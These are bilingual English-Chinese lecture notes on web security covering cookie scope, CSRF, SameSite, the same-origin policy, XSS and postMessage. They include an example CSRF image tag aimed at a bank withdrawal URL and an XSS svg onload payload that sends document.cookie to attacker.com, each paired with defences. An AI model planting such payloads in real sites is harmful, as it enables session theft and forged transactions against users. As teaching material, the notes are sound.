#### Cookie Policy

Continue last lecture

Don't relay on `Path` of cookie. not safe. can be bypassed using iframe.

Cookie Policy: cookie of a website can be accessed by same or more specific domains. so use a subdomain.

#### Problem with ambient authority, CSRF
Consider this html embedded in attacker.com

```html
<img src='https://bank.example.com/withdraw?from=bob&to=mallory&amount=1000'>
```
Browser includes bank.example.com cookies in all requests to bank.com, even though the request originated from attacker.com.

This is cross-site request forgery (CSRF). Use `SameSite` cookie attribute to prevent CSRF.
`SameSite=None`: default, always send cookie; `SameSite=Lax`: withhold cookies on subresource requests originating from other sites, allow them on top-level requests【如果第三方网站尝试通过图片、脚本或其他资源发起请求，Cookie 将不会被发送。当用户从外部网站导航到原始网站（例如，通过链接点击）时，浏览器会发送 Cookie】; 
`SameSite=Strict`: only send cookies if the request originates from the website that set the cookie.

```
Set-Cookie: key=value; Secure; HttpOnly; Path=/; SameSite=Lax
```
Site 的定义：https://web.dev/articles/samesite-cookies-explained


#### Same Origin Policy

Origin: protocol, hostname, port

> 同源策略是由浏览器负责执行的。浏览器在处理网页请求和执行网页脚本时，会检查请求的源（即协议、域名和端口号）是否与当前网页的源相同。如果不同，浏览器就会根据同源策略限制或阻止某些操作。防止恶意网站读取我的数据，但同源策略例外地不禁止加载静态资源如图片、脚本等。

For example, cross-origin fetch is prohibited. However, SOP is not enforced for certain web features. Some exceptions such as loading images, scripts from sites of different origins.

#### Bypass SOP, XSS, CSRF
同源策略禁止跨源读取数据。但是可以使用同源策略的例外盗取cookie.
Inject the following code to user input
```html
<svg onload="fetch('attacker.com?q='+document.cookie)" />
```
直接跨源fetch违背同源策略，但是加载图片是同源策略的例外，通过`onload`里fetch这样就绕过了同源策略限制。防御：设置cookie`httpOnly`属性禁止js获取cookie.

同源策略不禁止跨源提交表单。利用这一点进行CSRF。防御设置cookie的`sameSite`属性。

#### Cross-Origin Communication

Workaround idea 1: need a way round SOP to allow different origins to communiocate. `document.domain`. sites share a common top-level domain.
- For example, both `login.stanford.edu` and `axess.stanford.edu` set `document.domain = 'stanford.edu'` 
- This is bad. Because this allow anyone on stanford.edu to join the party. `attacker.stanford.edu` can also set `document.domain` to `stanford.edu` to become same origin with others.

Idea 2: Send messages from a parent page to a child iframe.
- Parent is allowed to navigate child iframes
- Child can poll for changes to fragement identifier
- Encode data in URL fragment identifiers

### The `PostMessage` cross-origin communication
- Send strings and aribitrarily complicated data cross-origin
- Useful features:
    - structured clone 算法是 postMessage API 中使用的一种算法，它允许你传递几乎任何类型的数据，包括但不限于原始数据类型（如数字、字符串、布尔值）、对象、数组等。这个算法能够递归地复制对象的属性，包括嵌套的对象和数组，从而创建一个与原始数据结构相同的副本。使用 structured clone 算法的优点是：安全性：由于 postMessage 只能传递克隆的数据副本，而不是原始数据的引用，因此可以防止潜在的数据污染或恶意操作。灵活性：可以传递复杂的数据结构，包括循环引用的对象。兼容性：structured clone 算法被现代浏览器广泛支持。然而，structured clone 也有其局限性，比如它不能克隆一些特殊的对象，如函数、Error 对象、DOM 节点等。
    - "Trnasferrable objects" allows transferring ownership of an object. It becomes unusuable in the context it was sent from.

